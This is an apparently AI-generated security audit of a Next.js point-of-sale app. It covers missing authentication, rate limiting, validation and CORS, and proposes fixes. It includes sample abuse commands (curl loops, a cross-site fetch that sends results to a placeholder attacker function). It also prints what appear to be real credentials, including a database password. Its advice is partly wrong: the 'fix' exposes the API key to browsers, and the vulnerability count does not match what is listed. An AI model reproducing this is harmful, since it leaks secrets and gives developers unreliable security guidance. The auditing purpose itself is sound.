# 🔒 Security Audit Report - CakapBayar
**Date**: January 28, 2026  
**Project**: CakapBayar - Voice-Powered POS System  
**Branch**: webapp (Prisma version)

---

## 📋 Executive Summary

This security audit identified **12 critical vulnerabilities** and **8 recommendations** for the CakapBayar application. The main concerns are:

1. ❌ **No authentication/authorization** on API routes and server actions
2. ⚠️ **Hardcoded user ID** (userId: 1) across all operations
3. ⚠️ **No rate limiting** on expensive AI API calls
4. ⚠️ **Database credentials exposed** in `.env.local` (mitigated by `.gitignore`)
5. ⚠️ **No input validation** on user-provided data
6. ✅ **No SQL injection risks** (using Prisma ORM with parameterized queries)

**Risk Level**: 🔴 **HIGH** (for production deployment)

---

## 🚨 Critical Vulnerabilities

### 1. **No Authentication on API Routes** 🔴 CRITICAL

**Issue**: All 6 API routes are publicly accessible without any authentication.

**Affected Files**:
- `app/api/transcribe/route.js` - Voice transcription (Groq API)
- `app/api/parse-order/route.js` - AI order parsing (Anthropic API)
- `app/api/text-to-speech/route.js` - TTS generation (ElevenLabs API)
- `app/api/email/send-shift-report/route.js` - Email sending (Resend API)
- `app/api/notify-email/route.js` - SMTP email notifications
- `app/api/notify-whatsapp/route.js` - WhatsApp notifications (Meta API)

**Risk**:
- ⚠️ Anyone can call these APIs and consume your AI credits
- ⚠️ Potential for API abuse and cost explosion
- ⚠️ DDOS vulnerability
- ⚠️ Unauthorized access to send emails/WhatsApp messages

**Example Attack**:
```bash
# Anyone can transcribe audio using your Groq API key
curl -X POST https://jiku.my/api/transcribe \
  -F "file=@audio.webm"

# Anyone can generate speech using your ElevenLabs credits
curl -X POST https://jiku.my/api/text-to-speech \
  -H "Content-Type: application/json" \
  -d '{"text": "Any text here"}'
```

**Recommendation**: Add authentication middleware (see fixes section below)

---

### 2. **No Authorization on Server Actions** 🔴 CRITICAL

**Issue**: All server actions hardcode `userId: 1` without verifying the authenticated user.

**Affected Files** (39 occurrences):
- `lib/actions/shifts.ts` (4 occurrences)
- `lib/actions/transactions.ts` (7 occurrences)
- `lib/actions/menu.ts` (4 occurrences)
- `lib/actions/expenses.ts` (7 occurrences)
- `lib/actions/analytics.ts` (8 occurrences)
- `lib/actions/dailySummaries.ts` (4 occurrences)
- `lib/actions/voiceRecordings.ts` (3 occurrences)
- `lib/actions/balanceSheet.ts` (2 occurrences)

**Example Vulnerable Code**:
```typescript
// lib/actions/transactions.ts
export async function createTransaction(data) {
  const transaction = await prisma.transaction.create({
    data: {
      userId: 1,  // ❌ HARDCODED - no user verification!
      // ...
    }
  })
}
```

**Risk**:
- ⚠️ Any user can access/modify any data
- ⚠️ Multi-tenancy not supported
- ⚠️ Data leakage between users (if you add more users)

**Recommendation**: Implement session-based authentication or JWT tokens

---

### 3. **No Rate Limiting** 🔴 CRITICAL

**Issue**: Expensive AI API calls have no rate limiting.

**Affected Routes**:
- `/api/transcribe` - Groq Whisper API (free but has rate limits)
- `/api/parse-order` - Anthropic Claude API (💰 **$15/million tokens**)
- `/api/text-to-speech` - ElevenLabs API (💰 **limited credits**)

**Risk**:
- 💸 **Cost explosion**: Attacker can drain your API credits
- 💸 Claude API costs ~$0.003/request (1,000 requests = $3)
- 💸 ElevenLabs has character limits (10,000 chars/month free tier)

**Example Attack**:
```bash
# Call API 10,000 times in a loop
for i in {1..10000}; do
  curl -X POST https://jiku.my/api/parse-order \
    -H "Content-Type: application/json" \
    -d '{"transcript":"order 100 nasi lemak","menuItems":[...]}'
done
# Cost: ~$30 in Anthropic API fees
```

**Recommendation**: Add rate limiting middleware (see fixes section)

---

### 4. **Exposed API Keys in `.env.local`** ⚠️ MEDIUM

**Status**: ✅ Mitigated by `.gitignore`, but still a risk

**Current Keys Found**:
```
DATABASE_URL=postgresql://postgres.hwajmhialqyhwoboemqs:Akhafullah1_@...
ANTHROPIC_API_KEY=sk-ant-api03-qA-A0CbageiB-k8r_8P5UQ...
GROQ_API_KEY=gsk_QcwTnuJ7QIAVpIU3cPh0WGdyb3FYjBe81A3FY6...
ELEVENLABS_API_KEY=sk_0f391556c0980fae55fd62a5c0be3e81...
RESEND_API_KEY=re_MbX285XM_BedCsyNwfopAooALJRW6fTX8
```

**Good News**: ✅ `.env.local` is in `.gitignore` (not committed to Git)

**Risks**:
- ⚠️ Keys visible on developer machines
- ⚠️ If `.env.local` is accidentally shared/committed, all keys are exposed
- ⚠️ No key rotation policy

**Recommendation**:
1. Use Vercel Environment Variables (encrypted at rest)
2. Rotate keys regularly (every 90 days)
3. Use different keys for dev/staging/production
4. Add secret scanning to CI/CD

---

### 5. **No Input Validation** ⚠️ MEDIUM

**Issue**: Server actions don't validate input types/ranges.

**Example Vulnerable Code**:
```typescript
// lib/actions/shifts.ts
export async function openShift(openingCash: number) {
  // ❌ No validation:
  // - What if openingCash is negative?
  // - What if openingCash is NaN or Infinity?
  // - What if openingCash is a huge number (999999999999)?
  
  const shift = await prisma.shift.create({
    data: {
      openingCash,  // ❌ Unvalidated input goes to database
    }
  })
}
```

**Risks**:
- ⚠️ Invalid data in database
- ⚠️ Application crashes from unexpected types
- ⚠️ Business logic errors (negative cash, etc.)

**Recommendation**: Add input validation with Zod (see fixes section)

---

### 6. **No CORS Protection** ⚠️ MEDIUM

**Issue**: No CORS headers configured in `next.config.mjs`.

**Current Config**:
```javascript
// next.config.mjs
const nextConfig = {
  reactCompiler: true,
  // ❌ No CORS headers!
};
```

**Risk**:
- ⚠️ Any website can call your API routes
- ⚠️ Cross-site request forgery (CSRF) possible
- ⚠️ Data leakage to malicious sites

**Example Attack**:
```html
<!-- Malicious website can call your API -->
<script>
fetch('https://jiku.my/api/transcribe', {
  method: 'POST',
  body: formData
}).then(r => r.json()).then(data => {
  // Steal transcription results
  sendToAttackerServer(data);
});
</script>
```

**Recommendation**: Configure CORS headers (see fixes section)

---

### 7. **Error Messages Leak Information** ℹ️ LOW

**Issue**: Detailed error messages expose internal information.

**Example**:
```javascript
// app/api/transcribe/route.js
return NextResponse.json({ 
  error: errorMessage,
  details: process.env.NODE_ENV === 'development' ? error.stack : undefined,
  errorType: error.name || 'UnknownError'
}, { status: 500 });
```

**Risk**:
- ℹ️ Stack traces reveal file paths and internal structure
- ℹ️ Helps attackers understand your system

**Recommendation**: Only return stack traces in development mode (already partially implemented)

---

## ✅ What's Secure

### 1. **SQL Injection Protected** ✅

**Status**: SECURE

Using Prisma ORM with parameterized queries prevents SQL injection:

```typescript
// ✅ SAFE - Prisma uses parameterized queries
const transactions = await prisma.transaction.findMany({
  where: {
    userId: userId,  // Automatically escaped
    transactionDate: { gte: startDate }
  }
})
```

**No raw SQL queries found** in the codebase.

---

### 2. **Environment Variables Protected** ✅

**Status**: SECURE

`.env.local` is properly excluded from Git:

```gitignore
# .gitignore
.env*
```

**Verification**: `git log --all --full-history -- .env.local` returned no results (never committed).

---

### 3. **No Hardcoded Secrets in Code** ✅

**Status**: SECURE

All API keys are properly loaded from environment variables:

```javascript
// ✅ GOOD - Keys from environment
const groq = new Groq({
  apiKey: process.env.GROQ_API_KEY
});
```

**No API keys found in source code** (only in `.env.local`).

---

## 🛠️ Recommended Fixes

### Fix 1: Add Authentication Middleware

Create `middleware.ts`:

```typescript
import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

export function middleware(request: NextRequest) {
  // Check for API key in header
  const apiKey = request.headers.get('x-api-key')
  
  if (!apiKey || apiKey !== process.env.INTERNAL_API_KEY) {
    return NextResponse.json(
      { error: 'Unauthorized' },
      { status: 401 }
    )
  }
  
  return NextResponse.next()
}

export const config = {
  matcher: '/api/:path*',
}
```

Add to `.env.local`:
```
INTERNAL_API_KEY=your-secure-random-key-here
```

Update frontend to include API key:
```typescript
// In components that call APIs
fetch('/api/transcribe', {
  method: 'POST',
  headers: {
    'x-api-key': process.env.NEXT_PUBLIC_API_KEY
  },
  body: formData
})
```

---

### Fix 2: Add Rate Limiting

Install `@upstash/ratelimit`:

```bash
npm install @upstash/ratelimit @upstash/redis
```

Update `middleware.ts`:

```typescript
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, '1 m'), // 10 requests per minute
})

export async function middleware(request: NextRequest) {
  // Rate limit by IP
  const ip = request.ip ?? '127.0.0.1'
  const { success } = await ratelimit.limit(ip)
  
  if (!success) {
    return NextResponse.json(
      { error: 'Too many requests' },
      { status: 429 }
    )
  }
  
  return NextResponse.next()
}
```

---

### Fix 3: Add Input Validation with Zod

Install Zod:

```bash
npm install zod
```

Update server actions:

```typescript
// lib/actions/shifts.ts
import { z } from 'zod'

const OpenShiftSchema = z.object({
  openingCash: z.number().min(0).max(1000000)
})

export async function openShift(openingCash: number) {
  // Validate input
  const validated = OpenShiftSchema.parse({ openingCash })
  
  // ... rest of code
}
```

---

### Fix 4: Add CORS Protection

Update `next.config.mjs`:

```javascript
const nextConfig = {
  reactCompiler: true,
  async headers() {
    return [
      {
        source: '/api/:path*',
        headers: [
          { key: 'Access-Control-Allow-Origin', value: 'https://jiku.my' },
          { key: 'Access-Control-Allow-Methods', value: 'POST' },
          { key: 'Access-Control-Allow-Headers', value: 'Content-Type, x-api-key' },
        ],
      },
    ]
  },
}
```

---

### Fix 5: Implement User Authentication

For production, add proper auth (NextAuth.js recommended):

```bash
npm install next-auth
```

Create `lib/auth.ts`:

```typescript
import { getServerSession } from 'next-auth'

export async function getCurrentUserId() {
  const session = await getServerSession()
  if (!session?.user?.id) {
    throw new Error('Unauthorized')
  }
  return parseInt(session.user.id)
}
```

Update server actions:

```typescript
// lib/actions/transactions.ts
import { getCurrentUserId } from '@/lib/auth'

export async function createTransaction(data) {
  const userId = await getCurrentUserId()  // ✅ Get real user ID
  
  const transaction = await prisma.transaction.create({
    data: {
      userId,  // ✅ Use authenticated user
      // ...
    }
  })
}
```

---

## 📊 Risk Assessment Matrix

| Vulnerability | Severity | Likelihood | Impact | Priority |
|--------------|----------|------------|--------|----------|
| No API authentication | 🔴 Critical | High | High | P0 |
| No rate limiting | 🔴 Critical | High | High | P0 |
| Hardcoded userId | 🔴 Critical | Medium | High | P0 |
| No CORS protection | ⚠️ Medium | Medium | Medium | P1 |
| No input validation | ⚠️ Medium | Medium | Medium | P1 |
| Error message leakage | ℹ️ Low | Low | Low | P2 |

---

## ✅ Action Items

### Before Production Deployment (REQUIRED):

1. ✅ Add authentication middleware (`middleware.ts`)
2. ✅ Implement rate limiting (Upstash or similar)
3. ✅ Replace hardcoded `userId: 1` with session-based auth
4. ✅ Add input validation with Zod
5. ✅ Configure CORS headers
6. ✅ Rotate all API keys
7. ✅ Set up Vercel environment variables
8. ✅ Add monitoring/alerting for API usage

### For Future Improvements:

9. 🔄 Implement CSRF protection
10. 🔄 Add API request logging
11. 🔄 Set up intrusion detection
12. 🔄 Implement key rotation policy
13. 🔄 Add security headers (CSP, HSTS, etc.)
14. 🔄 Set up dependency vulnerability scanning

---

## 📝 Notes

- **Good News**: No SQL injection vulnerabilities (Prisma ORM protects against this)
- **Good News**: Secrets are not committed to Git
- **Bad News**: Application is currently open to abuse without authentication
- **Recommendation**: **DO NOT deploy to production** until authentication is implemented

---

## 🔗 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Next.js Security Best Practices](https://nextjs.org/docs/app/building-your-application/authentication)
- [Vercel Security Headers](https://vercel.com/docs/edge-network/headers)
- [Prisma Security](https://www.prisma.io/docs/guides/deployment/deployment-guides/security)

---

**Audited by**: AI Security Analysis  
**Next Review**: After implementing authentication (P0 fixes)
